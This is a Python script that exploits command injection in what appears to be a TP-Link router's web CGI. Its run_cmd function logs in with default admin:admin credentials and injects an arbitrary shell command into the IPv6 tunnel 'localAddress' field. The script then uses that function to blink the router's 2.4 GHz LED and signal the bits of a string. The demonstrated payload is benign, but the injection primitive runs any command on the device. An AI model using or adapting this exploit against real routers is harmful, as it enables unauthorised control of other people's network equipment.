import time
import requests

def run_cmd(cmd: str) -> str:
    url = "http://192.168.0.1/cgi?2&2"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "text/plain",
        "Referer": "http://192.168.0.1/mainFrame.htm",
        "Referrer-Policy": "strict-origin-when-cross-origin"
    }
    cookies = {
        "Authorization": "Basic YWRtaW46YWRtaW4="
    }
    data = (
        "[IPV6_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,1\r\n"
        "disableIPv6=0\r\n"
        "[IP6_TUNNEL#0,0,0,0,0,0#0,0,0,0,0,0]1,3\r\n"
        "enabled=1\r\n"
        "mechanism=2\r\n"
        f"localAddress=;{cmd};\r\n"
    )

    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    return response.text
def turn_led(is_on: bool) -> None:
    run_cmd(f"echo {int(is_on)} > /proc/tplink/led_wlan_24G")

def delay() -> None:
    time.sleep(5)

def signal_char(ch: chr) -> None:
    bits = list(map(int, format(ord(ch), '08b')))
    for bit in bits:
        turn_led(bit)
        delay()

def signal_str(string: str) -> None:
    turn_led(1)
    delay()
    for ch in string:
        signal_char(ch)
    for i in range(16):
        turn_led(0)
        delay()

signal_str("z")